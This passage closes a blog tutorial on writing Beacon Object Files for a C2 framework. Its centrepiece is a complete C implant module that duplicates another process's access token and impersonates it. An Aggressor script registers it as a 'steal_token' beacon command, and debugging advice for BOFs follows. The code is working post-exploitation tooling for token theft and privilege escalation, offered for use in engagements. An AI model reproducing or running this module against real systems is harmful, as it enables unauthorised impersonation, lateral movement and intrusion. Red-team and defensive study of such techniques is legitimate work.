+<p>Writing a 900-line BOF that does recon, enum, lateral movement, and persistence is a code smell. Split into <code class="language-plaintext highlighter-rouge">enum_users</code>, <code class="language-plaintext highlighter-rouge">enum_shares</code>, <code class="language-plaintext highlighter-rouge">run_as</code>, <code class="language-plaintext highlighter-rouge">persist_run_key</code>. Composable small BOFs &gt; one monolith.</p>
+
+<h2 id="a-production-example-steal-token-bof">A Production Example: Steal Token BOF<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#a-production-example-steal-token-bof" aria-label="Copy link to A Production Example: Steal Token BOF"><span aria-hidden="true">#</span></a></h2>
+
+<p>Pulling it together - duplicate a target process’s access token and impersonate:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"beacon.h"</span><span class="cp">
+</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">HANDLE</span>  <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">BOOL</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span>    <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span>    <span class="n">WINAPI</span> <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">OpenProcessToken</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PHANDLE</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span>    <span class="n">WINAPI</span> <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">LPSECURITY_ATTRIBUTES</span><span class="p">,</span>
+                                                          <span class="n">SECURITY_IMPERSONATION_LEVEL</span><span class="p">,</span>
+                                                          <span class="n">TOKEN_TYPE</span><span class="p">,</span> <span class="n">PHANDLE</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span>    <span class="n">WINAPI</span> <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">datap</span> <span class="n">p</span><span class="p">;</span>
+    <span class="n">BeaconDataParse</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+    <span class="n">DWORD</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">BeaconDataInt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p</span><span class="p">);</span>
+
+    <span class="n">HANDLE</span> <span class="n">hProc</span> <span class="o">=</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_QUERY_LIMITED_INFORMATION</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hProc</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_ERROR</span><span class="p">,</span> <span class="s">"OpenProcess(%d) failed: %d"</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">HANDLE</span> <span class="n">hTok</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ADVAPI32</span><span class="err">$</span><span class="n">OpenProcessToken</span><span class="p">(</span><span class="n">hProc</span><span class="p">,</span> <span class="n">TOKEN_DUPLICATE</span> <span class="o">|</span> <span class="n">TOKEN_QUERY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hTok</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_ERROR</span><span class="p">,</span> <span class="s">"OpenProcessToken: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">HANDLE</span> <span class="n">hDup</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ADVAPI32</span><span class="err">$</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">hTok</span><span class="p">,</span> <span class="n">TOKEN_IMPERSONATE</span> <span class="o">|</span> <span class="n">TOKEN_QUERY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
+                                   <span class="n">SecurityImpersonation</span><span class="p">,</span> <span class="n">TokenImpersonation</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hDup</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_ERROR</span><span class="p">,</span> <span class="s">"DuplicateTokenEx: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hTok</span><span class="p">);</span>
+        <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">ADVAPI32</span><span class="err">$</span><span class="n">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="n">hDup</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_OUTPUT</span><span class="p">,</span> <span class="s">"Impersonating token of PID %d"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_ERROR</span><span class="p">,</span> <span class="s">"ImpersonateLoggedOnUser: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+    <span class="p">}</span>
+
+    <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDup</span><span class="p">);</span>
+    <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hTok</span><span class="p">);</span>
+    <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hProc</span><span class="p">);</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Aggressor wrapper:</p>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">alias</span> <span class="n">steal_token</span> <span class="p">{</span>
+    <span class="kd">local</span><span class="p">(</span><span class="s1">'$bid $pid $barch $script'</span><span class="p">);</span>
+    <span class="err">$</span><span class="n">bid</span> <span class="o">=</span> <span class="err">$</span><span class="mi">1</span><span class="p">;</span>
+    <span class="err">$</span><span class="n">pid</span> <span class="o">=</span> <span class="err">$</span><span class="mi">2</span><span class="p">;</span>
+    <span class="err">$</span><span class="n">barch</span> <span class="o">=</span> <span class="n">barch</span><span class="p">(</span><span class="err">$</span><span class="n">bid</span><span class="p">);</span>
+    <span class="err">$</span><span class="n">script</span> <span class="o">=</span> <span class="n">script_resource</span><span class="p">(</span><span class="s2">"steal_token.x64.o"</span><span class="p">);</span>
+
+    <span class="n">bof_pack</span><span class="p">(</span><span class="err">$</span><span class="n">bid</span><span class="p">,</span> <span class="s2">"i"</span><span class="p">,</span> <span class="err">$</span><span class="n">pid</span><span class="p">);</span>
+    <span class="n">beacon_inline_execute</span><span class="p">(</span><span class="err">$</span><span class="n">bid</span><span class="p">,</span> <span class="n">readbof</span><span class="p">(</span><span class="err">$</span><span class="n">bid</span><span class="p">,</span> <span class="err">$</span><span class="n">script</span><span class="p">),</span> <span class="s2">"go"</span><span class="p">,</span> <span class="err">$</span><span class="n">null</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">beacon_command_register</span><span class="p">(</span><span class="s2">"steal_token"</span><span class="p">,</span> <span class="s2">"Duplicate target PID token &amp; impersonate"</span><span class="p">,</span>
+    <span class="s2">"Usage: steal_token &lt;pid&gt;"</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">lua</span></pre></div></div>
+
+<h2 id="debugging-bofs">Debugging BOFs<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#debugging-bofs" aria-label="Copy link to Debugging BOFs"><span aria-hidden="true">#</span></a></h2>
+
+<p>BOFs crash silently. The beacon reports “task completed” even when you segfaulted. Your debug workflow:</p>
+
+<ol>
+  <li><strong>Compile with</strong> <code class="language-plaintext highlighter-rouge">/Zi</code> and a PDB, then run the BOF through <code class="language-plaintext highlighter-rouge">bof_runner</code> (trustedsec) which loads a COFF with a real debugger attached.</li>
+  <li><strong>Log aggressively</strong> - <code class="language-plaintext highlighter-rouge">BeaconPrintf</code> at every branch.</li>
+  <li><strong>Test locally first</strong> - build a small <code class="language-plaintext highlighter-rouge">main()</code> that calls <code class="language-plaintext highlighter-rouge">go(args, len)</code> with synthetic arguments, run it under WinDbg, catch crashes.</li>
+</ol>
+
+<h2 id="summary">Summary<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#summary" aria-label="Copy link to Summary"><span aria-hidden="true">#</span></a></h2>
+
+<p>BOFs are a small, sharp tool. Once you internalize the “no CRT, no globals, one responsibility, dynamic resolution” model, they become the fastest way to add capability to your engagement - days, not weeks.</p>
+
+<blockquote>
+  <p>The PE loader is a complex beast. The BOF loader is 300 lines and two data structures. Everything great about in-process execution traces back to that simplicity.</p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+    <section class="related">
+      <div class="label" style="margin-bottom:14px">Continue · C2 development</div>
+      <div class="related-grid">
+        
+          
+          <a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/" class="related-card">
+            <span class="related-date">Apr 17, 2026</span>
+            <span class="related-t">Building a C2 Stack: Implants, BOF Loaders, Redirectors, and DoH Channels</span>
+            <span class="related-desc">A practical end-to-end guide to building command-and-control infrastructure - a minimal...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+          
+          <a href="https://robinx0.github.io/blogs/c2-development/implant-architecture-guide/" class="related-card">
+            <span class="related-date">Mar 20, 2026</span>
+            <span class="related-t">Designing a Modern C2 Implant: Architecture and OPSEC</span>
+            <span class="related-desc">A comprehensive guide to C2 implant architecture - covering communication protocols, ex...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+      </div>
+    </section>
+    
+
+    
+    
+    
+
+    <div class="article-foot">
+      <a href="https://robinx0.github.io/" class="btn-g">← Home</a>
+      <a href="https://robinx0.github.io/writeups?cat=C2+development" class="btn-g">More C2 development →</a>
+    </div>
+  </div>
+</article>
+
+    </div>
+
+    
+
+  </main>
+
+  
+
+  <!-- Image lightbox -->
+  <div class="lightbox-overlay" id="lightbox">
+    <button class="lightbox-close" type="button" aria-label="Close lightbox">×</button>
+    <button class="lightbox-nav lightbox-prev" type="button" aria-label="Previous image">‹</button>
+    <button class="lightbox-nav lightbox-next" type="button" aria-label="Next image">›</button>
+    <img class="lightbox-img" id="lightbox-img" alt="">
+    <div class="lightbox-caption mono" id="lightbox-caption"></div>
+  </div>
+
+  
+
+
+</body></html>
